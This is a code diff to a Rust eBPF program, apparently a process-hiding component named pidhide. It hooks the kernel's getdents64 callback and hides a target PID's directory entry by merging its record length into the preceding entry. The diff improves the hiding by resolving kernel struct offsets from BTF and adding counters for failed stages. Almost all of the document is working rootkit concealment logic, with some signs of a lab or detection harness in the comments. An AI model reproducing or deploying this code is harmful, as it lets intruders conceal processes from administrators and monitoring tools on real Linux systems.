@@ -62,26 +62,34 @@ use core::sync::atomic::{AtomicU64, Ordering};
 /// attaching, an estate left behind by a crashed run hides nobody),
 /// slots 1..5 are the counters the loader's census line reads back:
 /// the fires, the failed probe reads, the name matches, the writes
-/// that landed, the writes the kernel refused. A hide that does not
-/// land names its stage, never a guess.
+/// that landed, the writes the kernel refused. Slots 6 and 7 carry
+/// the container's field offsets, resolved from the host's own BTF
+/// by the loader before the attach; slots 8 and 9 name the two skips
+/// a hide can die of without reaching the write - a batch-leading
+/// entry (no predecessor to absorb into) and an absorb that would
+/// overflow the u16 record length. A hide that does not land names
+/// its stage, never a guess.
 #[map(name = "targets")]
-static TARGETS: Array<u64> = Array::with_max_entries(6, 0);
+static TARGETS: Array<u64> = Array::with_max_entries(10, 0);
 
-/// The `getdents_callback64` container's cursor field (`current_dir`,
-/// the user buffer position THIS entry is about to be written at):
-/// the dir_context the callback receives is the container's first
-/// field, and a dir_context is TWO pointers - the actor and the
-/// readdir position - so the container's second field sits at offset
-/// 16, not 8. The first shape read at 8 and caught the position
-/// pointer instead (the census named it: three matches, zero writes,
-/// the absorb's own u16 bound refusing the kernel pointer that rode
-/// the cursor seat). The one 12-byte probe read spans the cursor
-/// (u64 @16) and the predecessor's record length (`prev_reclen`,
-/// i32 @20) in a single call. The layout is the getdents64
-/// implementation's own, stable from the 5.15 floor through 6.x; a
-/// kernel that moved the fields fails the read or names itself in
-/// the absorb, never silently.
-const CONTAINER_CURSOR: usize = 16;
+/// The container offsets ride the host's own BTF, not constants:
+/// upstream hoisted the user-buffer budget into `dir_context` itself
+/// (6.x's filldir64 spends `ctx->count`), so the container's fields
+/// after the embedded context sat 8 bytes higher than the 5.15 floor
+/// carried them - and the first shape's hardcoded span read the
+/// budget where the cursor belonged and half a user pointer where
+/// the predecessor's length belonged. The parse matched, the absorb
+/// overflowed its u16 bound, and the skip returned WITHOUT a counter:
+/// the census said eighteen matches, zero writes, and no stage named.
+/// The loader now resolves `current_dir` and `prev_reclen` from the
+/// host's BTF (the same lesson the camera's offsets map carries) and
+/// writes the byte offsets into slots 6 and 7 before the attach; a
+/// kernel that moved or renamed the fields is refused by name in the
+/// loader, and the program keeps the zero offsets inert. The mask
+/// bounds the map-loaded scalar for the verifier: the loader validated
+/// the offset against the same bound, and a probe read at a masked
+/// offset cannot walk the pointer math out of range.
+const OFFSET_BOUND: u64 = 0xff;
 /// The dirent64 header the absorb formula rides on: d_ino (8) at 0,
 /// d_off (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at
 /// 19 - the kernel's own `ALIGN(offsetof(linux_dirent64, d_name) +
@@ -154,24 +162,50 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
             Some(pid) => *pid,
         };
 
+        // The container's field offsets, resolved from the host's own
+        // BTF by the loader. Zero offsets mean the loader could not
+        // resolve them and planted the estate anyway - inert, the
+        // observe-only contract (the loader refuses by name first;
+        // this is the belt under the braces).
+        let cursor_off = match TARGETS.get(6) {
+            Some(0) | None => return Ok(0),
+            Some(off) => (*off & OFFSET_BOUND) as usize,
+        };
+        let prev_off = match TARGETS.get(7) {
+            Some(0) | None => return Ok(0),
+            Some(off) => (*off & OFFSET_BOUND) as usize,
+        };
+
         // The container's own cursor: where this entry is about to be
         // written, and the predecessor's record length. prev_reclen 0
         // means this entry leads the batch - no predecessor to absorb
-        // into, the named skip (the loader's batch is large enough
-        // that the marker's entry practically never leads).
-        let mut head = [0u8; 12];
+        // into, and the skip NAMES the stage (the loader's batch is
+        // large enough that the marker's entry practically never
+        // leads).
+        let mut cursor_bytes = [0u8; 8];
         if bpf_probe_read_kernel_buf(
-            (container as usize as *const u8).add(CONTAINER_CURSOR),
-            &mut head,
+            (container as usize as *const u8).add(cursor_off),
+            &mut cursor_bytes,
         )
         .is_err()
         {
             bump(2);
             return Err(1i32);
         }
-        let cursor = u64::from_le_bytes(head[0..8].try_into().map_err(|_| 1i32)?) as usize;
-        let prev_reclen = u32::from_le_bytes(head[8..12].try_into().map_err(|_| 1i32)?) as usize;
+        let mut prev_bytes = [0u8; 4];
+        if bpf_probe_read_kernel_buf(
+            (container as usize as *const u8).add(prev_off),
+            &mut prev_bytes,
+        )
+        .is_err()
+        {
+            bump(2);
+            return Err(1i32);
+        }
+        let cursor = u64::from_le_bytes(cursor_bytes) as usize;
+        let prev_reclen = u32::from_le_bytes(prev_bytes) as usize;
         if cursor == 0 || prev_reclen == 0 {
+            bump(8);
             return Ok(0);
         }
 
@@ -216,6 +250,11 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
         let reclen = (namlen as usize + DIRENT_HEADER + 1 + 7) & !7usize;
         let grown = prev_reclen.wrapping_add(reclen);
         if grown > u16::MAX as usize {
+            // The stage this gate ate silently once: a wrong offset
+            // rode a garbage predecessor length through the parse and
+            // the overflow refused the absorb with no counter at all.
+            // Named now - the census says where a hide died.
+            bump(9);
             return Ok(0);
         }
         let value16: u16 = grown as u16;
